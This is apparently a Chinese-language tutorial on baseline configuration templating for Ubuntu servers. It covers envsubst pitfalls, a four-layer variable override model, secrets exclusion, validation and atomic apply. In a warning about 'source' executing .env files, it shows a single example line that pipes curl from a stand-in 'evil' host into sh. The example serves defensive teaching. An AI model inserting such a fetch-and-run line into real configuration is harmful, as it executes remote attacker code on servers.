# 基準設定與範本化

> [!abstract] 這篇你會學到
> - 把 SOP 裡「憑印象複製上一台」的基準設定，抽成 **git 裡可 diff、可稽核、可重放的範本**
> - 設計 **全域 → 角色 → 環境 → 單機**四層覆寫，並知道它是「整個取代」而不是合併
> - ★★★★★ 用 `envsubst` 白名單形式 render，避開**吃掉 `$remote_addr`** 與**未定義變數變空字串**兩個無聲坑
> - 建立 **render → validate → 原子替換 → reload → 驗證 → 失敗自動回滾**的套用管線
> - ★★★★ 用**無代理的 diff 法**做漂移偵測（configuration drift），任何機器都能跑，不必先裝任何平台
> - 判斷漂移該**立刻回填／先告警／納入白名單**，而不是全域開啟自動修復把 40 台一次打壞
> - 寫出 `/usr/local/sbin/baseline-render` 與 `/usr/local/sbin/baseline-apply` 兩支可直接上線的腳本
> - 知道封裝 golden image 前**必須清掉哪些檔案**，否則整批機器撞號、共用同一把主機金鑰

> [!warning] 未實機驗證
> 本篇 Ubuntu 24.04 側的指令與輸出，除特別註明外皆依官方文件與實際 shell 行為撰寫。
> **「映像與範本的分工」一節提到的 Proxmox VE `qm` 指令未在實機環境驗證**，
> 實作前請對照你手上 PVE 版本的官方文件，並先在測試 VM 上演練一次。

## 觀念說明

### 這篇卡在哪裡：01 與 05 之間的那一階

```text
[[020-02-03-01-svc-標準化-新機建置標準流程]]        本篇                   [[020-02-03-05-svc-標準化-自動化佈建入門]]
 ┌──────────────┐   ┌──────────────────┐   ┌──────────────┐
 │ 建【第一台】的 SOP │→ │ 把 SOP 的【值】抽成範本 │→ │ 用 Ansible 派給【N 台】│
 │ 七階段、22 項驗收  │   │ 四層變數 + envsubst   │   │ inventory / playbook │
 │ 產出：一台正確的機器 │   │ 產出：/srv/baseline repo│   │ 產出：N 台一致的機器  │
 └──────────────┘   └──────────────────┘   └──────────────┘
        手做              ★ 這一階最常被跳過 ★              自動化
```

★★★★ **大多數機關是直接從左邊跳到右邊，然後失敗。**
理由很簡單：Ansible playbook 裡要填的那些值（NTP 伺服器、日誌保留天數、允許的 SSH 群組），
如果你從來沒把它們從「上一台的 `/etc`」裡整理出來，你在寫 playbook 的當下**還是在憑印象填**，
只是把憑印象的結果自動化派到 40 台而已。

本篇的工具主線刻意選 **`envsubst`**（`gettext-base` 套件，Ubuntu／RHEL 幾乎都內建）：

| 為什麼是 envsubst | 說明 |
| --- | --- |
| ★★★★ **不必先裝任何平台** | 舊機、離線機、剛裝好的機器都能跑，沒有「先建控制節點」的門檻 |
| ★★★ **維運人員看得懂** | 範本就是設定檔本身，只是把值換成 `${BASELINE_XXX}`，稽核人員也讀得懂 |
| ★★★ **是 05 篇的前置台階** | 你在這裡整理出來的四層 `.env`，可以一對一搬進 `group_vars` / `host_vars` |
| ★★ **失敗面小** | 一支 shell 腳本，出事時 `bash -x` 就查得完 |

> [!note] 本篇不寫 Jinja2 語法
> Jinja2 / Ansible `template` 模組是這條路的**升級路徑**，不是本篇的內容。
> [[020-02-03-05-svc-標準化-自動化佈建入門]] 已明文把 Jinja2 語法排除在自己的範圍外，本篇也不重複 ——
> 兩篇都不寫是刻意的，需要時請直接看 Ansible 官方的 Templating 文件（見〈延伸閱讀〉）。
> 本篇只在〈升級路徑〉給一張「四層 `.env` 對應 `group_vars` / `host_vars`」的對照表。

### ★★★★ 真值來源（source of truth）只能有一個

這是全篇的地基。先看兩種做法三年後的差別：

```text
【A】照抄上一台（機關現況，越抄越歪）

   web-prd-01 的 /etc  ──scp──▶ web-prd-02 的 /etc
        │                            │
        │（有人臨時改了 sysctl）        │（有人臨時改了 sshd）
        ▼                            ▼
   web-prd-03 ◀──scp── 從 02 抄     web-prd-04 ◀──scp── 從 03 抄
        │
        ▼
   ★★★★ 三年後：四台都不一樣，沒有人知道哪一台是「對的」，
          也沒有人知道每個差異是「當初刻意的」還是「有人手滑」。


【B】從 repo render（本篇要建的）

              /srv/baseline（git，唯一真值）
              vars/ + templates/ + bin/
                       │
        ┌──────────┬───┴──────┬──────────┐
        ▼          ▼          ▼          ▼
   web-tst-01  web-prd-01  web-prd-02  db-prd-01
        │          │          │          │
        └──────────┴─── 每天 06:00 --check ───┴─── 有差就報告
   ★ 每台的差異都是「變數的差異」，而變數的差異在 git log 裡有原因、有人名、有日期。
```

★★★★★ **機器上的 `/etc` 不是真值，repo 才是。**
這句話講起來像口號，但它有兩個非常具體的後果，**你必須選一個**：

| 你選的 | 會發生什麼 | 代價 |
| --- | --- | --- |
| ★★★★ **repo 是真值**（本篇立場） | 有人臨時在機器上改一行，**下次套用會被無聲覆蓋** | 必須建立「改完要回填 repo」的紀律，並靠漂移偵測抓漏 |
| ★★★★ **機器是真值**（放棄範本） | 沒人敢再跑套用，怕蓋掉別人的臨時修改 | 範本永遠追不上現況，**三個月後變成廢紙**，還誤導接手的人 |

> [!danger] 最糟的是「兩者都不是真值」
> 也就是：範本存在、但只有一半的檔進去；套用腳本存在、但沒人敢跑。
> ★★★★★ 這比完全沒有範本更危險 —— 因為新人會**相信** repo 裡的內容代表現況，
> 照著它去判斷「這台機器有沒有開 root 登入」，然後得到錯的答案。
>
> **判斷方式很簡單**：如果你不敢在正式機上跑 `baseline-apply --check`，
> 你的範本已經是廢紙了。

### ★★★★ 什麼該進範本、什麼絕對不該進

#### 正面清單：本篇實際要範本化的檔

| 檔案 | 為什麼適合範本化 | 變數層 |
| --- | --- | --- |
| ★★★ `/etc/chrony/chrony.conf` | 每台都一樣，只有 NTP 來源與 makestep 會依環境不同 | 全域 + 環境 |
| ★★★★ `/etc/sysctl.d/99-baseline.conf` | 安全與網路參數，**全機關必須一致**，最常被人手改 | 全域 + 角色 |
| ★★★ `/etc/systemd/journald.conf.d/50-baseline.conf` | 日誌保留量與天數，正式／測試不同 | 全域 + 環境 |
| ★★★ `/etc/logrotate.d/org-app` | 應用日誌輪替，保留天數依環境 | 環境 |
| ★★★ `/etc/apt/apt.conf.d/50unattended-upgrades` | 自動更新政策與通知信箱，全機關一致 | 全域 |
| ★★★★ `/etc/ssh/sshd_config.d/50-baseline.conf` | 加固項，**改錯會鎖門**，正因如此更該版本控管 | 全域 + 單機例外 |
| ★★ `/etc/issue.net` | 登入警語，機關名稱與聯絡窗口 | 全域 |
| ★★★ UFW 規則清單（不是檔案，是變數 + 套用腳本） | 角色差異最大的一項 | 角色 |
| ★★ `/etc/apt/sources.list.d/*.sources`、`/etc/apt/preferences.d/*` | 允許哪些來源進得來 | 全域 |

> [!note] APT 來源與 pinning 的細節不在本篇
> `.sources` 的 deb822 欄位、`Signed-By` 金鑰指紋雙管道驗證、pinning 寫法，
> 全部在 [[020-02-03-03-cmd-標準化-第三方APT套件庫實務]]。本篇只把這兩類檔**列進範本清單**，
> 用同一套 render／apply 管線派下去，寫法請看那篇。

#### ★★★★★ 反面清單：進了 git 就等同外洩

| 絕對不進 repo | 進去了會怎樣 |
| --- | --- |
| ★★★★★ 任何私鑰（`id_*`、`*.key`、`*.pem`） | git 歷史**永久保留**；repo 一旦給廠商或推到內部 GitLab，等於把私鑰發出去 |
| ★★★★★ `/etc/ssh/ssh_host_*`（主機金鑰） | 全機關機器共用同一把主機金鑰 → **中間人攻擊時客戶端察覺不到** |
| ★★★★★ `/etc/shadow`、任何明文密碼、資料庫連線字串 | 密碼雜湊可離線破解；稽核直接開缺失 |
| ★★★★ `/etc/machine-id`、`/var/lib/dbus/machine-id` | 這是**每台唯一**的識別碼，複製出去會造成 journald 與 DHCP 撞號 |
| ★★★ DHCP lease（`/var/lib/dhcp/*`）、`cloud-init` 產物 | 是狀態不是設定，帶著走只會製造混亂 |
| ★★★ 憑證私鑰與 `.p12` | 同私鑰。公開憑證（CA 根憑證）可以進，私鑰不行 |

`/srv/baseline/.gitignore`：

```text

*.key
*.pem
*.p12
*.pfx
id_rsa*
id_ed25519*
ssh_host_*
shadow
*secret*
*password*

# ★★★ 狀態檔，不是設定
machine-id
*.lease
*.pid
*.log

# ★★ render 產物不進 repo（每次都能重新產生）
out/
staging/
*.rendered
```

> [!danger] 已經 commit 進去了怎麼辦
> ★★★★★ **改密碼／換金鑰的優先序高於改 git 歷史。**
>
> ```text
> 【1】立刻視為已外洩：換掉那把金鑰、改掉那組密碼、撤銷那張憑證。
>      —— 這一步做完，歷史裡留著的就只是一份【已失效】的資料。
> 【2】才去處理 git 歷史（rewrite、force push、通知所有 clone 過的人重新 clone）。
> 【3】檢查 repo 有沒有被 fork／mirror／備份到別處 —— 這些副本不會因為你 rewrite 而消失。
> ```
>
> 補救的完整步驟（含 `git filter-repo`、通知範圍、事後檢查）在
> [[060-01-01-09-guide-Git-團隊規範與實戰情境]]，本篇不重複。
> ★★★ 順序寫反（先花三小時洗歷史、隔天才換金鑰）是機關最常見的錯誤反應。

### ★★★★★ 四層覆寫模型

```text
   vars/global.env        全機關共通基準
        │                 （時區、NTP、稽核設定、警語、更新政策）
        │ 被覆寫
        ▼
   vars/role-web.env      角色差異
        │                 （web 要開 80/443、somaxconn 調大）
        │ 被覆寫
        ▼
   vars/env-prd.env       環境差異
        │                 （正式環境日誌留 180 天、makestep 更嚴格）
        │ 被覆寫
        ▼
   vars/host-web-prd-01.env   單機例外
                          （★★★ 必須寫：原因 + 核准人 + 到期日）
```

實作上就是**依序 `source` 四個檔**，後載入的同名變數蓋掉先載入的。

#### ★★★★ 合併規則：後層是「整個取代」，不是「合併」

這是四層模型唯一會咬人的地方，而且**清單型變數特別致命**：

```text
global.env      BASELINE_UFW_ALLOW="22/tcp"
role-web.env    BASELINE_UFW_ALLOW="80/tcp 443/tcp"     ← 只寫了新增的兩條

實際結果        BASELINE_UFW_ALLOW="80/tcp 443/tcp"
                ★★★★ 22/tcp 不見了 —— 套用後【SSH 進不去】。
```

★★★★ **兩種解法，本篇選第一種：**

| 解法 | 做法 | 評價 |
| --- | --- | --- |
| ★★★★ **重抄一次（本篇採用）** | `role-web.env` 寫 `BASELINE_UFW_ALLOW="22/tcp 80/tcp 443/tcp"` | 笨，但**打開檔案就知道這個角色的完整清單**，稽核與交接都省事 |
| ★★ 拆成 `_COMMON` + `_EXTRA` 再串接 | `BASELINE_UFW_ALLOW="$BASELINE_UFW_COMMON $BASELINE_UFW_EXTRA"` | 少抄幾行，但要看兩個檔才知道實際值；★★★ 這已經是該升級到 Ansible 的訊號 |

★★★★ 不管選哪一種，**render 之後一定要把最終值印出來存證**（本篇腳本的 `--dump-vars`），
因為「我以為它是 X，其實是 Y」是四層模型唯一的失敗模式。

#### ★★★ 單機例外的三個必填欄位

單機層 `vars/host-*.env` 不是「隨便寫」的地方，**每一條例外都要有三欄**：

```ini
# ── vars/host-web-prd-01.env ────────────────────────────────
# 例外 1
#   原因：舊版列印中介軟體只支援 TLS 1.2，需放寬 ssl 設定
#   核准：資訊室 王課長（變更單 CHG-2026-0731）
#   到期：2026-12-31（屆期未展延則自動回收，回到角色層預設）
BASELINE_TLS_MIN="TLSv1.2"
```

| 欄位 | 沒寫的後果 |
| --- | --- |
| ★★★★ **原因** | 三年後沒人敢刪，因為不知道刪了會壞什麼 → 例外永久化 |
| ★★★★ **核准人** | 稽核問「誰同意這台可以不符基準」時答不出來 |
| ★★★★ **到期日** | ★ 例外沒有到期日就等於**基準有一個洞**，而且洞會越開越多 |

★★★ **判準：同一個例外出現在三台以上，就該升級成角色層或環境層。**
三台以上還叫「例外」，代表你的角色分類切錯了，不是那三台特別。

#### ★★★ 變數命名規則

| 規則 | 原因 |
| --- | --- |
| ★★★★ 一律 `BASELINE_` 前綴、全大寫 | envsubst 的白名單就靠這個前綴自動產生（見下方腳本） |
| ★★★★ **不要用 `TZ`、`LANG`、`USER`、`HOME`、`PATH` 這類名字** | 它們是**已存在的環境變數**，範本會被操作者當下 shell 的值悄悄填進去 |
| ★★★ 名稱要含「單位」 | `BASELINE_LOG_KEEP_DAYS` 好過 `BASELINE_LOG_KEEP`，避免「30 是天還是筆」 |
| ★★ 布林值統一用 `yes` / `no` | 因為多數設定檔（sshd、unattended-upgrades）用的就是這組字面值 |

> [!danger] ★★★★ 變數名撞到真實環境變數的實際後果
> 範本寫 `Timezone=${TZ}`，你在自己的 SSH session 裡 `TZ` 剛好是空的 →
> render 出 `Timezone=`；同事的 session 裡 `TZ=UTC` → render 出 `Timezone=UTC`。
> **同一份範本、同一個 repo，兩個人 render 出不同結果**，而且 git diff 看不出原因。
> 加 `BASELINE_` 前綴這件事，就是在防這個。

### ★★★ 變數檔為什麼選 `.env` 而不是 YAML

| 比較項 | `.env`（key=value） | YAML |
| --- | --- | --- |
| envsubst 能不能直接吃 | ★★★★ 能（`set -a` + `source`） | 不能，要先轉換 |
| 腳本能不能直接讀 | ★★★★ 能，`source` 一行 | 要 `yq` / python |
| `git diff` 好不好讀 | ★★★ 一行一個值，衝突好解 | 縮排改動會產生大片 diff |
| 稽核人員看不看得懂 | ★★★ 看得懂 | 需要解釋巢狀結構 |
| 巢狀結構 / 清單 / 條件 | ✗ 沒有 | ✓ 有 |

★★★★ **`.env` 的三個極限 —— 碰到就別硬撐：**

| 出現這種需求 | 為什麼 `.env` 做不到 | 該怎麼辦 |
| --- | --- | --- |
| ★★★ 需要**巢狀結構**（每個 vhost 各有一組 server_name / root / cert） | key=value 是平的，只能用 `SITE1_`、`SITE2_` 硬編，數量一多就爆炸 | 升級到 Ansible + `group_vars` |
| ★★★ 需要**真正的清單**並在範本裡迴圈展開 | 只能塞成空白分隔字串，範本本身無法 `for` | 升級到 Ansible template（Jinja2 `for`） |
| ★★★★ 需要**條件判斷**（prd 才啟用某段設定） | envsubst 只會取代，不會判斷；只能拆成兩份範本 | 升級到 Ansible template（Jinja2 `if`） |

出現第三種需求時，很多人會用「render 兩份範本再自己接起來」硬撐 ——
★★★ 那一刻你已經在寫一個很爛的樣板引擎了，直接讀 [[020-02-03-05-svc-標準化-自動化佈建入門]] 換工具比較快。

#### 升級路徑：四層 `.env` 一對一搬進 Ansible

| 本篇 | [[020-02-03-05-svc-標準化-自動化佈建入門]] | 備註 |
| --- | --- | --- |
| `vars/global.env` | `group_vars/all.yml` | 全機關共通 |
| `vars/role-web.env` | `group_vars/web.yml` | 角色 |
| `vars/env-prd.env` | `group_vars/prd.yml` | 環境 |
| `vars/host-web-prd-01.env` | `host_vars/web-prd-01.yml` | 單機例外 |
| `templates/*.tpl` + envsubst | `templates/*.j2` + `template` 模組 | ★★★ 語法要改寫，但**變數名不用改** |
| `baseline-apply --check` | `ansible-playbook --check --diff` | 概念完全對應 |
| `baseline-apply --apply --host X` | `ansible-playbook --limit X` | 縮小打擊範圍 |

★★★★ 因為變數名不用改，**先做本篇再導 Ansible 幾乎沒有沉沒成本**；
反過來（先導 Ansible 再回頭整理變數）就會邊改 playbook 邊猜值。

### ★★★ 派送方式選型

範本 render 出來以後，怎麼送到 40 台？三種都合法，看你手上有什麼：

| 方式 | 適用 | 缺點 | 細節在哪篇 |
| --- | --- | --- | --- |
| ★★★★ **每台跑本地腳本**（本篇主線，`git pull` + `baseline-apply`） | 3～30 台、沒有集中管理平台 | 要靠 timer 拉，機器離線就落後 | 本篇 |
| ★★★ **打包成 `org-baseline-config` 這個 deb 走內部 APT** | 已有內部套件庫、要走 `conffiles` 保留使用者微調 | 每次改基準都要重打包、重簽章 | [[020-02-03-04-svc-標準化-自建APT套件庫]] |
| ★★★★ **Ansible push** | 30 台以上、要分批與乾跑報告 | 需要控制節點與 SSH 金鑰佈署 | [[020-02-03-05-svc-標準化-自動化佈建入門]] |

★★ 三種可以並存：本篇的 repo 是**內容來源**，deb 與 Ansible 只是**運送方式**。

```bash
sudo mkdir -p /srv/baseline/{vars,templates,bin,docs}
```

### 【3】★★★ 差異參數怎麼抽出來（從現有機房跨進範本化的唯一入口）

你不是從零開始，你手上已經有一堆跑著的機器。**第一步永遠是 diff 兩台同角色的現役機器**。

在管理機上把兩台的 `/etc` 抓回來（★★★ 只讀不寫，對正式機零風險）：

```bash
mkdir -p ~/etcdiff/{web-prd-01,web-prd-02}
sudo rsync -a --numeric-ids \
  --exclude='ssh/ssh_host_*' --exclude='shadow*' --exclude='gshadow*' \
  --exclude='machine-id' --exclude='ssl/private' --exclude='*.key' \
  root@10.20.30.41:/etc/ ~/etcdiff/web-prd-01/
sudo rsync -a --numeric-ids \
  --exclude='ssh/ssh_host_*' --exclude='shadow*' --exclude='gshadow*' \
  --exclude='machine-id' --exclude='ssl/private' --exclude='*.key' \
  root@10.20.30.42:/etc/ ~/etcdiff/web-prd-02/
```

★★★★ **那五個 `--exclude` 不是為了少抓檔，是為了不要把私鑰與密碼雜湊複製到管理機上。**

比對：

```bash
diff -r -q ~/etcdiff/web-prd-01 ~/etcdiff/web-prd-02 | grep -v -E \
  'blkid|adjtime|resolv.conf|hostname|hosts|machine-id|lvm/(archive|backup)|udev/hwdb.bin|\.pyc'
```

預期輸出（節錄）：

```text
Files .../web-prd-01/chrony/chrony.conf and .../web-prd-02/chrony/chrony.conf differ
Files .../web-prd-01/sysctl.d/99-tuning.conf and .../web-prd-02/sysctl.d/99-tuning.conf differ
Only in .../web-prd-02/ssh/sshd_config.d: 99-debug.conf          # ★★★★ 只有一台有 → 極可能是漂移
Files .../web-prd-01/nginx/sites-available/app.conf and ... differ
```

#### ★★★★ 每一條差異只能歸到三類，不准放著

| 類別 | 判斷方法 | 處置 |
| --- | --- | --- |
| ★★★ **該變成變數** | 差異只是「值」不同，兩邊都合理（IP、hostname、埠、保留天數、憑證檔名） | 抽成 `BASELINE_*`，放進最低適用的那一層 |
| ★★★ **該變成角色／環境差異** | 差異來自「這台是 db 不是 web」「這台是測試」 | 放進 `role-*.env` 或 `env-*.env` |
| ★★★★ **這是漂移，該修掉** | 差異沒有人說得出原因，或說得出但沒有變更單 | ★ 記進 `docs/CHANGELOG.md`，收斂成統一值 |

實際判讀範例：

```text
差異：web-prd-01 有 net.core.somaxconn=1024，web-prd-02 是 4096
問：為什麼？→「02 有次尖峰調的」→ 有沒有變更單？→ 沒有
結論：★★★★ 這是漂移，但【調高是對的】
      → 把 4096 寫進 role-web.env（第二類：該變成角色差異），兩台一起收斂。

差異：只有 web-prd-02 的 sshd_config.d 有 99-debug.conf
問：為什麼？→「上個月排查用的」→ 排查結束了嗎？→ 結束了
結論：★★★★ 純漂移，刪掉。這種檔就是本篇要抓的東西。
```

> [!tip] ★★★ 第一輪不要求「全部收斂」
> 抽變數這件事跟盤點一樣，**第一輪只要把「該變成變數」的那類做完就好**。
> 第三類（漂移）留在 `docs/CHANGELOG.md` 的待辦清單裡分次處理 ——
> 一次想全部拉平，最後就是一次也沒做。

## 基礎設定：寫第一個範本並 render

### 範本長什麼樣

範本就是設定檔本身，只有兩個差別：**值換成 `${BASELINE_*}`**、**開頭加一段檔頭**。

`templates/chrony.conf.tpl`：

```text
# ★★★★ 本檔由 baseline-render 產生，請勿手改。
# 要修改請改 /srv/baseline 並送 PR；手改的內容會在下次套用時被覆蓋。
# baseline-version: ${BASELINE_VERSION}
# contact: ${BASELINE_CONTACT}

server ${BASELINE_NTP1} iburst
server ${BASELINE_NTP2} iburst
driftfile /var/lib/chrony/chrony.drift
makestep ${BASELINE_NTP_MAKESTEP}
rtcsync
logdir /var/log/chrony
```

> [!danger] ★★★★★ 檔頭裡【不要】放 render 的時間戳
> 很多人會加一行 `# generated at 2026-08-28 06:00:03`。後果是：
>
> ```text
> 每天 06:00 的漂移偵測 → render 出來的時間戳一定跟線上檔不同
>   → 每天每台都報「有漂移」→ 三天後所有人開始忽略這個報告
>   → ★★★★★ 真的漂移發生時沒有人看。
> ```
>
> ★★★★ 檔頭只放**會隨基準版本改變**的東西（`BASELINE_VERSION`、聯絡窗口）。
> 這樣一來，當某台還停在舊基準版本，diff 會漂亮地在第一行就告訴你 —— 那是**有用**的差異。

### ★★★★★ envsubst 的三個坑

這是本篇最有價值的一段。三個坑都**不會報錯**，只會產出看起來很正常的錯檔。

#### 坑① 裸跑 envsubst 會吃掉所有 `$` 開頭的合法變數名

實測（用一份混了 nginx、awk、shell 寫法的範本）：

```bash
cat > /tmp/demo.tpl <<'EOF'
server ${BASELINE_NTP1} iburst
nginx:  log_format main '$remote_addr $host';
awk:    awk '{print $NF}'
shell:  echo "$1 ${1}"
EOF

export BASELINE_NTP1=tock.stdtime.gov.tw
envsubst < /tmp/demo.tpl          # ★★★★★ 沒有白名單的裸跑
```

實際輸出：

```text
server tock.stdtime.gov.tw iburst
nginx:  log_format main ' ';                 # ★★★★★ $remote_addr 與 $host 被吃成空字串
awk:    awk '{print }'                       # ★★★★★ $NF 也被吃掉了
shell:  echo "$1 ${1}"                       # ★★ $1 活著（不是合法變數名，envsubst 不動它）
```

★★★★★ **注意 `$1` 活著、`$NF` 死了。** 這比「全部被吃」更危險 ——
你在範本裡測了幾個 `$1`、`$2` 覺得沒事，結果 `$remote_addr`、`$host`、`$NF`、`$SERVER_NAME`
這些**符合 `[A-Za-z_][A-Za-z0-9_]*` 的名字全部變成空字串**。

正確做法是**白名單形式**（把要取代的變數列出來當第一個參數）：

```bash
envsubst '${BASELINE_NTP1}' < /tmp/demo.tpl
```

實際輸出：

```text
server tock.stdtime.gov.tw iburst
nginx:  log_format main '$remote_addr $host';    # ★★★★ 沒被列進白名單 → 原樣保留
awk:    awk '{print $NF}'
shell:  echo "$1 ${1}"
```

★★★★ 白名單不用手抄，用前綴自動產生（本篇腳本用的就是這招）：

```bash
WL=$(compgen -v | grep '^BASELINE_' | sed 's/^/${/; s/$/}/' | tr '\n' ' ')
echo "$WL"
```

預期輸出：

```text
${BASELINE_CONTACT} ${BASELINE_NTP1} ${BASELINE_NTP2} ${BASELINE_TZ} ${BASELINE_VERSION} 
```

★★★ 這也是「所有變數都要 `BASELINE_` 前綴」這條規則的實際理由 ——
前綴不是為了好看，是為了讓白名單能自動、完整、不漏。

#### 坑② 未定義的變數被換成空字串，而且**不會報錯**

```bash
unset BASELINE_SSH_PORT
printf 'Port ${BASELINE_SSH_PORT}\nAllowGroups ${BASELINE_SSH_GROUPS}\n' > /tmp/s.tpl
envsubst '${BASELINE_SSH_PORT} ${BASELINE_SSH_GROUPS}' < /tmp/s.tpl; echo "rc=$?"
```

實際輸出：

```text
Port 
AllowGroups 
rc=0                     # ★★★★★ 退出碼 0 —— envsubst 認為自己成功了
```

後果分層級：

| 產出 | 服務的反應 | 嚴重度 |
| --- | --- | --- |
| `Port `（sshd） | ★★★★ `sshd -t` 會報 `Missing argument`，還好會被擋下 | 中 |
| `server  iburst`（chrony） | ★★★★ `chronyd -p` 報錯，會被擋下 | 中 |
| `net.core.somaxconn = `（sysctl） | ★★★ `sysctl --dry-run` 會抱怨 | 中 |
| ★★★★★ `AllowGroups `（sshd）在**某些版本**只是警告 | 語法過關，語意是「不允許任何群組」→ **全機關鎖門** | 極高 |
| ★★★★★ `SystemMaxUse=`（journald） | 語法合法，意思是「用預設值」→ 你以為限制了 2G，其實沒有 | 高（無聲） |

★★★★★ **解法：render 之前先檢查必填變數。** 用 shell 的 `:?` 展開：

```bash
: "${BASELINE_SSH_PORT:?未定義，請檢查 vars/global.env}"
```

未定義時的實際輸出：

```text
/usr/local/sbin/baseline-render: line 62: BASELINE_SSH_PORT: 未定義，請檢查 vars/global.env
```

★★★ 搭配 `set -euo pipefail`，腳本會**在這一行就停住**，不會產出半殘的設定檔。

★★★★ 第二道保險：render 完掃一次產出檔，抓「指令後面沒有值」的行：

```bash
grep -nE '^[[:space:]]*[A-Za-z][A-Za-z0-9_]*[[:space:]]*$|=[[:space:]]*$' /run/baseline-staging/*/*
```

看到任何一行 → 有變數被 render 成空字串，**不要套用**。

#### 坑③ 產出檔沒有檔頭與正確權限

```bash
# ★★★ 產出檔一律 root:root，且【不要】給 group/other 寫入
sudo install -o root -g root -m 0644 /run/baseline-staging/web-prd-01/chrony.conf /tmp/x
stat -c '%a %U:%G %n' /tmp/x
```

預期輸出：

```text
644 root:root /tmp/x
```

| 為什麼在意 | 說明 |
| --- | --- |
| ★★★★★ sshd 的 drop-in 若 **group/world 可寫**，sshd 會拒絕啟動或忽略該檔 | `Bad ownership or modes` |
| ★★★★ 沒有「請勿手改」檔頭 | 半夜救火的人不知道這檔是自動產生的，改完就等著被覆蓋 |
| ★★★ 檔頭沒寫「要改請改 repo」與聯絡窗口 | 他即使知道不能改，也不知道該找誰 |

★★★ sshd drop-in 本篇一律用 `0600`（TWGCB 也是這個要求，見 [[090-06-06-guide-TWGCB-Linux大量派送]]）。

### 四層變數的載入實作

```bash
set -a                                  # ★★★★ 之後 source 進來的變數自動 export
                                        #      envsubst 讀的是【環境變數】，沒 export 就取不到
source /srv/baseline/vars/global.env
source /srv/baseline/vars/role-web.env
source /srv/baseline/vars/env-prd.env
[ -f /srv/baseline/vars/host-web-prd-01.env ] && source /srv/baseline/vars/host-web-prd-01.env
set +a

echo "$BASELINE_UFW_ALLOW"
```

預期輸出：

```text
22/tcp 80/tcp 443/tcp
```

> [!danger] ★★★★ `source` 等於執行
> `.env` 是被 shell **執行**的，不是被解析的。
> `vars/global.env` 裡若有一行 `BASELINE_TZ=$(curl -s http://evil/x | sh)`，它就會跑。
>
> 三道防線（本篇腳本都有實作）：
> - ★★★★ `/srv/baseline` 權限 `0750 root:root`，一般帳號改不了
> - ★★★★ 腳本載入前檢查每個 `.env` 的 owner 是 root 且不可群組寫入，不符就拒絕執行
> - ★★★ 變數檔的變更走 PR + code review（[[060-01-01-09-guide-Git-團隊規範與實戰情境]]）

### 清單型變數在 `.env` 裡的寫法

`.env` 沒有清單，只能用**空白分隔字串 + 迴圈展開**：

```ini
# vars/role-web.env
# ★★★★ 這是【整個取代】全域層的值，所以 22/tcp 必須重抄一次
BASELINE_UFW_ALLOW="22/tcp 80/tcp 443/tcp"
```

```bash
for rule in $BASELINE_UFW_ALLOW; do          # ★★★ 這裡刻意不加引號，要讓它做 word splitting
  sudo ufw allow "$rule"
done
sudo ufw status numbered
```

預期輸出：

```text
Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 80/tcp                     ALLOW IN    Anywhere
[ 3] 443/tcp                    ALLOW IN    Anywhere
```

★★★ 這就是 `.env` 的極限現場：**它做得到「展開」，做不到「差集」** ——
你沒辦法表達「把角色層的規則加上去，但同時移除全域層的某一條」。
規則需要相減時，就該換 Ansible 了（`ufw` 模組有 `delete: yes`），細節見 [[090-02-02-guide-防火牆-ufw基礎與實務]]。

## 進階設定與調校

### ★★★★ 驗證關卡：render → validate → 才寫入

```text
 vars/*.env ─┐
             ├─▶ envsubst ─▶ /run/baseline-staging/  ─▶ 語法檢查 ─┬─ 過 ─▶ 允許套用
 templates/ ─┘                （tmpfs，不碰 /etc）              └─ 不過 ─▶ 中止，/etc 完全沒被動過
```

★★★★★ **中間不准跳。** 「反正 apply 的時候會檢查」是錯的 ——
apply 的時候檢查，代表你已經開始動 `/etc` 了。

#### 每種設定檔的檢查器

| 檔案 | 檢查指令 | 通過的樣子 | 星級 |

> [!danger] ★★★★★ Ubuntu 24.04：改 `Port` 之後 `systemctl reload ssh` 沒有用
> Ubuntu 24.04 預設是 **socket 活化**（`ssh.socket`）：實際在 22 埠 listen 的是 systemd，
> 埠號由一支 systemd generator 從 `sshd_config` 與 `sshd_config.d/` 讀出來後產生 socket 設定。
>
> ```bash
> systemctl is-enabled ssh.socket        # enabled → 你的機器是 socket 活化
> ```
>
> ★★★★★ 所以改完 `Port` 必須：
>
> ```bash
> sudo systemctl daemon-reload           # 重新產生 socket 設定 ← 少了這行埠不會變
> sudo systemctl restart ssh.socket
> ss -lntp | grep sshd\\\|systemd
> ```
>
> ★★★ 好消息：socket 活化下每條連線是獨立的 `sshd` 實例，
> `restart ssh.socket` **不會踢掉現有 session**，但新連線會立刻吃到新設定 ——
> 所以「留一條舊 session」這條鐵則在這裡一樣有效，而且更好用。
>
> ★★ RHEL 9 預設仍是 `sshd.service`（非 socket 活化），改完 `reload sshd` 即可。

> [!info]- Rocky / AlmaLinux（RHEL 系）sshd drop-in 對照
> ```bash
> head -5 /etc/ssh/sshd_config
> ```
> ★★★★ RHEL 9 的 `sshd_config` 第一段就有 `Include /etc/ssh/sshd_config.d/*.conf`，
> 與 Ubuntu 相同，drop-in 直接可用。
> **RHEL 8 要先自己確認有沒有這行**（不同 minor 版本不一致）；沒有的話 drop-in 完全不會被讀，
> 而且**不會有任何錯誤訊息** —— 你會以為設定生效了。
>
> ★★★★★ 另外 RHEL 系有 SELinux：從別處 `mv` 進 `/etc` 的檔案會帶著錯誤的 context，
> sshd 可能讀不到。套用後一定要補：
> ```bash
> sudo restorecon -Fv /etc/ssh/sshd_config.d/50-baseline.conf
> ```

### ★★★★ 原子式套用與自動回滾

```text
/run/baseline-staging/...           tmpfs（★★★★ 跟 /etc 不同檔案系統！）
        │  cp
        ▼
/etc/.baseline-tmp/50-baseline.conf.new     ← ★★★★ 跟 /etc 同一個 fs
        │  mv（= rename(2)，原子）
        ▼
/etc/ssh/sshd_config.d/50-baseline.conf
```

> [!danger] ★★★★ 「原子」的前提是同一個檔案系統
> `mv` 在**同一個 fs** 內是 `rename(2)`，核心保證瞬間完成 ——
> 任何時刻讀這個路徑，讀到的不是舊檔就是新檔，不會是半份。
>
> ★★★★ **跨 fs 的 `mv` 是「複製 + 刪除」**，中間有一段時間檔案是不完整的。
> `/run` 是 tmpfs、`/etc` 通常在根分割 → **直接從 `/run` `mv` 到 `/etc` 不是原子操作**。
> 這段窗口裡若 logrotate、sshd 或監控剛好讀了那個檔，就會讀到半份設定。
>
> ★★★★★ 更不要用 `cat tpl > /etc/xxx.conf` ——
> `>` 是「先清空再逐段寫入」，窗口比跨 fs 的 mv 還長，而且**寫到一半失敗就毀了原檔**。

